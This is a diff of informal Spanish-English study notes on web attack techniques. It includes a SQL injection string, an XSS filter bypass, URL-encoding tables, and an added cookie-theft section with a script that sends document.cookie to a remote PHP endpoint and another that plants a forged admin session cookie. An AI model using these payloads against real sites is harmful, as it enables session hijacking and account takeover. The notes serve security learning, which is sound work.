@@ -1,4 +1,5 @@
-Null byte atack --> %00
+Null byte atack --> %00 , el final de un string despues del cual ya no se lee nada
+IYECTION--> ' or 1=1--  |(--) significa, la sentencia acaba aqui
 quotation marks as %22 ---> ",  injection quotes 
 xss JS -->  <scr<script>ipt> | otra forma --> ....\/ (SE PERDERA ..\ DEJANDO ../)
 take a look always in logs file if is it posible!
@@ -6,3 +7,37 @@ Para las cooquies en NODE, usar jwt--> tokens de javascipt, token =  (header,bod
 	la sign esta compuesta por el head y body, si uno de los dos cambia
 	la verficacion con la clave secreta en el servidor ya no vale
 <https://tudominio.com/que-es-una-url-canonica> --> can be useful
+
+---->> URLs are permitted to contain only the printable characters in the US-ASCII
+%3d — =
+n %25 — %
+n %20 — Space
+n %0a — New line
+n %00 — Null byte
+n &#34; — "
+n &#39; — '
+€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
+
+---->>>IMPORTANTE => siempre tenere en cuenta un ataque en  funcion de la codificacion
+
+
+Ataques :
+bypass -->> saltarse el paso de seguridad
+
+@@@@@@@@@@@@@@@@@   Robar cookies
+<button onclick="loadDoc()" style="color:red">Fuck</button>
+---------------- 1º SCRIPT
+<script>
+    function loadDoc(){
+        
+        window.location = "http://localhost/Prueba.php?hack="+document.cookie;
+    }
+</script>
+---------------- 2º SCRIPT
+<script>
+    function loadDoc(){
+        
+        document.cookie = "user:=admin; PHPSESSID=eqhvqtpulp1r43euncdf0qva84; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada";
+    }
+</script>
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
